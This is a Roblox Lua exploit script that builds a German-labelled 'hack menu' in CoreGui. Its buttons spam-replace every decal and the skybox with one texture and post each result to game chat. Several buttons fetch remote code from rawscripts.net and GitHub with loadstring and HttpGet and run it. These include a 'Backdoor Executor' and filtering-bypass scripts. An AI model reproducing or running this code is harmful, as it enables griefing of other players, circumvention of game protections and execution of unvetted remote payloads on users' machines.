local targetTextureID = "90475798976269"
local rbxAssetURL = "rbxassetid://" .. targetTextureID

if not _G.DeutschesMenu then
    _G.DeutschesMenu = true
    
    -- ========== FUNKTIONEN ========== --
    
    -- 1. Decal Spam Funktion
    local function decalSpam()
        pcall(function()
            local ersetzteDecals = 0
            
            for _, obj in ipairs(workspace:GetDescendants()) do
                if obj:IsA("Decal") or obj:IsA("Texture") then
                    pcall(function()
                        obj.Texture = rbxAssetURL
                        ersetzteDecals += 1
                    end)
                end
            end
            
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                "âœ… " .. ersetzteDecals .. " Decals ersetzt", 
                "All"
            )
        end)
    end

    -- 2. Himmel Textur ersetzen
    local function himmelErsetzen()
        pcall(function()
            local lighting = game:GetService("Lighting")
            local himmel = lighting:FindFirstChildOfClass("Sky")
            
            if not himmel then
                himmel = Instance.new("Sky")
                himmel.Parent = lighting
            end
            
            himmel.SkyboxBk = rbxAssetURL
            himmel.SkyboxDn = rbxAssetURL
            himmel.SkyboxFt = rbxAssetURL
            himmel.SkyboxLf = rbxAssetURL
            himmel.SkyboxRt = rbxAssetURL
            himmel.SkyboxUp = rbxAssetURL
            
            himmel.StarCount = 0
            himmel.SunAngularSize = 0
            himmel.MoonAngularSize = 0
            
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                "âœ… Himmeltextur geÃ¤ndert", 
                "All"
            )
        end)
    end

    -- 3. Caducus FE Executor
    local function caducusAusfuehren()
        pcall(function()
            loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FE-Caducus-The-fallen-god-REQUIRES-REANIMATION-TO-WORK-47600", true))()
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                "âœ… Caducus FE ausgefÃ¼hrt", 
                "All"
            )
        end)
    end

    -- 4. Backdoor Executor
    local function backdoorAusfuehren()
        pcall(function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/Botsupport-cpu/Krnl-menu/refs/heads/main/Krnl%20menu", true))()
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                "âœ… Backdoor aktiviert", 
                "All"
            )
        end)
    end

    -- 5. Knife FE Executor
    local function knifeFEAusfuehren()
        pcall(function()
            loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Grab-knife-v4-24753", true))()
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                "âœ… Knife FE v4 ausgefÃ¼hrt", 
                "All"
            )
        end)
    end

    -- 6. Mobile Keyboard Executor (NEU)
    local function mobileKeyboardAusfuehren()
        pcall(function()
            -- Mobile Keyboard von GitHub
            loadstring(game:HttpGet("https://raw.githubusercontent.com/advxzivhsjjdhxhsidifvsh/mobkeyboard/main/main.txt", true))()
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                "âœ… Mobile Keyboard aktiviert", 
                "All"
            )
        end)
    end

    -- ========== ERWEITERTES DEUTSCHES MENÃœ ========== --
    
    local function erstelleMenu()
        if game:GetService("CoreGui"):FindFirstChild("DeutschesHackMenu") then
            game:GetService("CoreGui").DeutschesHackMenu:Destroy()
        end

        local ScreenGui = Instance.new("ScreenGui")
        ScreenGui.Name = "DeutschesHackMenu"
        ScreenGui.Parent = game:GetService("CoreGui")
        ScreenGui.ResetOnSpawn = false

        local HauptFrame = Instance.new("Frame")
        HauptFrame.Name = "HauptFrame"
        HauptFrame.Size = UDim2.new(0.45, 0, 0.7, 0)
        HauptFrame.Position = UDim2.new(0.02, 0, 0.15, 0)
        HauptFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
        HauptFrame.BorderColor3 = Color3.fromRGB(255, 200, 0)
        HauptFrame.BorderSizePixel = 2
        HauptFrame.Active = true
        HauptFrame.Parent = ScreenGui

        local Titel = Instance.new("TextLabel")
        Titel.Size = UDim2.new(1, 0, 0.07, 0)
        Titel.Text = "ðŸ”§ DEUTSCHES HACK MENÃœ"
        Titel.TextColor3 = Color3.fromRGB(255, 200, 0)
        Titel.BackgroundTransparency = 1
        Titel.Font = Enum.Font.SourceSansBold
        Titel.TextSize = 16
        Titel.Parent = HauptFrame

        -- MenÃ¼knÃ¶pfe mit neuer Mobile Keyboard Funktion
        local knoepfe = {
            {Text = "ðŸŽ¨ DECAL SPAM", Pos = 0.08, Color = Color3.fromRGB(0, 150, 255), Func = decalSpam},
            {Text = "ðŸŒŒ HIMMEL ERSETZEN", Pos = 0.16, Color = Color3.fromRGB(100, 0, 200), Func = himmelErsetzen},
            {Text = "âš¡ CADUCUS FE", Pos = 0.24, Color = Color3.fromRGB(139, 0, 139), Func = caducusAusfuehren},
            {Text = "ðŸ”ª KNIFE FE v4", Pos = 0.32, Color = Color3.fromRGB(200, 0, 0), Func = knifeFEAusfuehren},
            {Text = "ðŸ”“ BACKDOOR EXECUTOR", Pos = 0.40, Color = Color3.fromRGB(0, 100, 0), Func = backdoorAusfuehren},
            {Text = "ðŸ“± MOBILE KEYBOARD", Pos = 0.48, Color = Color3.fromRGB(150, 0, 150), Func = mobileKeyboardAusfuehren}
        }

        for _, knopf in ipairs(knoepfe) do
            local button = Instance.new("TextButton")
            button.Size = UDim2.new(0.9, 0, 0.12, 0)
            button.Position = UDim2.new(0.05, 0, knopf.Pos, 0)
            button.Text = knopf.Text
            button.BackgroundColor3 = knopf.Color
            button.TextColor3 = Color3.fromRGB(255, 255, 255)
            button.Font = Enum.Font.SourceSansBold
            button.TextSize = 11
            button.BorderSizePixel = 1
            button.BorderColor3 = Color3.fromRGB(50, 50, 50)
            button.Parent = HauptFrame
            button.MouseButton1Click:Connect(knopf.Func)
        end

        -- Info Text mit allen Funktionen
        local InfoText = Instance.new("TextLabel")
        InfoText.Size = UDim2.new(0.9, 0, 0.25, 0)
        InfoText.Position = UDim2.new(0.05, 0, 0.62, 0)
        InfoText.Text = "ðŸ“‹ FUNKTIONEN:\nâ€¢ Decal Spam System\nâ€¢ Himmel Textur Wechsel\nâ€¢ Caducus FE Bypass\nâ€¢ Knife FE v4 Script\nâ€¢ Backdoor Executor\nâ€¢ Mobile Keyboard\n\nTexture ID: " .. targetTextureID
        InfoText.TextColor3 = Color3.fromRGB(200, 200, 100)
        InfoText.BackgroundTransparency = 1
        InfoText.Font = Enum.Font.SourceSans
        InfoText.TextSize = 10
        InfoText.TextXAlignment = Enum.TextXAlignment.Left
        InfoText.Parent = HauptFrame

        -- SchlieÃŸen Knopf
        local SchliessenKnopf = Instance.new("TextButton")
        SchliessenKnopf.Size = UDim2.new(0.12, 0, 0.07, 0)
        SchliessenKnopf.Position = UDim2.new(0.84, 0, 0.005, 0)
        SchliessenKnopf.Text = "X"
        SchliessenKnopf.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
        SchliessenKnopf.TextColor3 = Color3.fromRGB(255, 255, 255)
        SchliessenKnopf.Font = Enum.Font.SourceSansBold
        SchliessenKnopf.TextSize = 12
        SchliessenKnopf.Parent = HauptFrame
        SchliessenKnopf.MouseButton1Click:Connect(function()
            ScreenGui:Destroy()
        end)

        -- ========== BEWEGUNGSYSTEM ========== --
        
        local UserInputService = game:GetService("UserInputService")
        local wirdGezogen = false
        local zugStart = Vector3.new()
        local startPosition = UDim2.new()

        local function bewegen(input)
            if wirdGezogen and input.UserInputType == Enum.UserInputType.Touch then
                local delta = Vector3.new(input.Position.X, input.Position.Y, 0) - zugStart
                local neueX = math.clamp(startPosition.X.Offset + delta.X, 0, 800)
                local neueY = math.clamp(startPosition.Y.Offset + delta.Y, 0, 500)
                HauptFrame.Position = UDim2.new(0, neueX, 0, neueY)
            end
        end

        HauptFrame.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.Touch then
                wirdGezogen = true
                zugStart = Vector3.new(input.Position.X, input.Position.Y, 0)
                startPosition = HauptFrame.Position
                HauptFrame.BorderColor3 = Color3.fromRGB(0, 255, 0)
            end
        end)

        HauptFrame.InputEnded:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.Touch then
                wirdGezogen = false
                HauptFrame.BorderColor3 = Color3.fromRGB(255, 200, 0)
            end
        end)

        UserInputService.InputChanged:Connect(function(input)
            bewegen(input)
        end)
    end

    -- MenÃ¼ erstellen
    erstelleMenu()

    -- Auto-Restore nach Respawn
    game:GetService("Players").LocalPlayer.CharacterAdded:Connect(function()
        task.wait(2)
        if not game:GetService("CoreGui"):FindFirstChild("DeutschesHackMenu") then
            erstelleMenu()
        end
    end)
end
